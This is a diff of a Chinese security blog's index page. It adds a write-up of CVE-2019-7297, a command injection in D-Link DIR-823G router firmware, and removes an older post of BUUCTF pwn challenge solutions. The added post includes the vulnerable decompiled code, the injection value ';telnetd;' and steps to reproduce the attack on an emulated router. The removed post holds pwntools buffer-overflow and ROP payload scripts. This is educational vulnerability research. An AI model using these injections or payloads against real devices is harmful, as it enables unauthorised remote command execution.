@@ -60,10 +60,10 @@
 			</ul>
 		</nav>
                                 <nav>
-                                               总文章数 38
+                                               总文章数 39
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">65.5k</span>
+	总字数 <span class="post-count">66k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -157,6 +157,120 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-CVE-2019-7297漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        <div align="center" class="post-count">
+    字数：740字 | 预计阅读时长：3分钟
+</div>
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/">CVE-2019-7297漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2024-01-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2019-7297漏洞"><a href="#CVE-2019-7297漏洞" class="headerlink" title="CVE-2019-7297漏洞"></a>CVE-2019-7297漏洞</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>vulnerability_id: CVE-2019-7297<br>affected_vendor: D-Link<br>firmware_version: DIR-823G<br>firmware_architecture: MIPS32<br>file_system: Squashfs<br>vulnerability_type: Command Injection<br>vulnerability_score: 9.8<br>vulnerability_severity: Critical<br>CWE_type: CWE-78<br>communication_protocol: SOAP、HNAP<br>simulation_method: FAT<br>vulnerability_description: An issue was discovered on D-Link DIR-823G devices with firmware through 1.02B03. A command Injection vulnerability allows attackers to execute arbitrary OS commands via shell metacharacters in a crafted &#x2F;HNAP1 request.<br>This occurs when the GetNetworkTomographyResult function calls the system function with an untrusted input parameter named Address. Consequently, an attacker can execute any command remotely when they control this input.</p>
+<p>此类漏洞在两款路由器中均存在，多处HNAP功能函数在调用系统shell执行相关命令时，没有严格过滤外部输入参数，导致命令注入漏洞</p>
+<p><strong>漏洞原理：</strong>该漏洞位于DIR-823G的&#x2F;bin&#x2F;goahead，GetNetworkTomographyResult函数对应的处理流程sub_442260，<code>goahead</code> 是一个开源的 <code>web</code> 服务器，用户的定制性非常强。可以通过一些 <code>goahead</code> 的 <code>api</code>定义 <code>url</code>处理函数和可供 <code>asp</code> 文件中调用的函数</p>
+<p>goahead的websUrlHandlerDefine函数允许用户自定义不同url的处理函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">websUrlHandlerDefine(T(<span class="string">&quot;/HNAP1&quot;</span>), NULL, <span class="number">0</span>, websHNAPHandler, <span class="number">0</span>);</span><br><span class="line">websUrlHandlerDefine(T(<span class="string">&quot;/goform&quot;</span>), NULL, <span class="number">0</span>, websFormHandler, <span class="number">0</span>);</span><br><span class="line">websUrlHandlerDefine(T(<span class="string">&quot;/cgi-bin&quot;</span>), NULL, <span class="number">0</span>, websCgiHandler, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>代表&#x2F;HNAP1的请求交给websHNAPHandler函数处理，&#x2F;gofrom的请求交给websFormHandler函数处理，&#x2F;cgi-bin的请求交websCgiHandler函数处理。</p>
+<p>该函数的具体代码如下：</p>
+<p>binwalk提取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DIR823GA1_FW102B03.bin</span><br></pre></td></tr></table></figure>
+
+<p>漏洞代码</p>
+<p>GetNetworkTomographyResult获取address，number，size参数，作为ping的参数。</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240131202655564.png"></p>
+<p>分析这段代码</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( apmib_get(<span class="number">7026</span>, v13) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">snprintf</span>(v16, <span class="number">6</span>, <span class="string">&quot;ping  &quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(v13);</span><br><span class="line">  <span class="built_in">strncat</span>(v16, v13, v1);</span><br><span class="line">  <span class="keyword">if</span> ( apmib_get(<span class="number">7027</span>, &amp;v17) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcat</span>(v16, <span class="string">&quot; -c &quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(v14, <span class="string">&quot;%d -w %d&quot;</span>, v17, v17);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(v14);</span><br><span class="line">    <span class="built_in">strncat</span>(v16, v14, v2);</span><br><span class="line">    <span class="keyword">if</span> ( apmib_get(<span class="number">7028</span>, &amp;v18) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcat</span>(v16, <span class="string">&quot; -s &quot;</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v15, <span class="string">&quot;%d&quot;</span>, v18);</span><br><span class="line">      v3 = <span class="built_in">strlen</span>(v15);</span><br><span class="line">      <span class="built_in">strncat</span>(v16, v15, v3);</span><br><span class="line">      <span class="built_in">strcat</span>(v16, <span class="string">&quot; &gt; /tmp/ping.txt 2&gt;&gt;/tmp/ping.txt&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(v16);</span><br><span class="line">      system(v16);</span><br><span class="line">      v10 = fopen(<span class="string">&quot;/tmp/ping.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !fread(v12, <span class="number">1</span>, <span class="number">49152</span>, v10) )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;fread ping.txt is error &quot;</span>);</span><br><span class="line">        fclose(v10);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;/tmp/ping.txt is NULL&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ghidra中的分析</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201150521809.png"></p>
+<p>伪代码：</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240131204354056.png"></p>
+<p>上述代码执行以下操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping address -c number -w number -s size &gt; /tmp/ping.txt 2&gt;&gt;/tmp/ping.txt</span><br></pre></td></tr></table></figure>
+
+<p>在system之前并没有对这些外来参数进行检查，如果address为<code>;telnetd;</code>就能启动Telnet服务。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ghidra看一下</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201133626818.png"></p>
+<p>在ida中alt+t查找0x1b72等关键变量，定位到apmib_set的位置，结合ghidra的反汇编代码，确定在<code>SetNetworkTomographySettings</code>函数中可以对这些参数进行设置。</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201140047127.png"></p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201134459964.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fap.py -q ./qemu-builds/2.5.0/ ./DIR823GA1_FW102B03.bin </span><br></pre></td></tr></table></figure>
+
+<p>开启仿真</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240131181248151.png"></p>
+<p>设置浏览器代理127.0.0.1:8080,使用mitproxy抓包</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201142402762.png"></p>
+<p>回车进入查看包的具体信息</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201142657842.png"></p>
+<p>按e选择request-body</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201144036136.png"></p>
+<p>修改包</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201143159910.png"></p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201143455241.png"></p>
+<p>退出编辑后按r重新发送，访问192.168.0.1&#x2F;hack.txt，可以看到攻击成功了。</p>
+<p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201143735916.png"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/leonW7/D-Link/blob/master/Vul_1.md">https://github.com/leonW7/D-Link/blob/master/Vul_1.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5705?time__1311=n4+xnD07DtKYq0K0=G8Dlhjeo84=eiDui6ioD&alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/5705?time__1311=n4%2BxnD07DtKYq0K0%3DG8Dlhjeo84%3DeiDui6ioD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzgslh/article/details/105214670">https://blog.csdn.net/zzgslh/article/details/105214670</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于system函数缺乏对参数的过滤，用户构造的输入也可能被执行，命令注入错误。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-1-29" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -1285,91 +1399,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2023/09/18/SROP/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-buuctf-pwn刷题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        <div align="center" class="post-count">
-    字数：122字 | 预计阅读时长：1分钟
-</div>
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/">buuctf-pwn刷题</a>
-    </h1>
-  
-
-        
-        <a href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2023-09-15T08:55:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1、test_your_nc</p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230917175722461.png" alt="image-20230917175722461"></p>
-<p>题解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28839</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>2、rip</p>
-<p>直接溢出，注意栈平衡</p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918165950595.png" alt="image-20230918165950595"></p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918165959788.png" alt="image-20230918165959788"></p>
-<p>题解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26953</span>)</span><br><span class="line">system_addr = <span class="number">0x401040</span></span><br><span class="line">bin_addr = <span class="number">0x40201B</span> </span><br><span class="line">pop_rdi = <span class="number">0x4011fb</span></span><br><span class="line">ret_addr = <span class="number">0x401198</span></span><br><span class="line">call_system = <span class="number">0x401187</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>  + p64(ret_addr) + p64(pop_rdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>绕了一下，不过差不多。</p>
-<p>3、warmup_csaw_2016</p>
-<p>给了system函数，直接gets溢出</p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918170608714.png" alt="image-20230918170608714"></p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918170616415.png" alt="image-20230918170616415"></p>
-<p>题解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./warmup&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29760</span>)</span><br><span class="line">sys_addr = <span class="number">0x40060D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/">展开全文 >></a>
         </p>
       
 
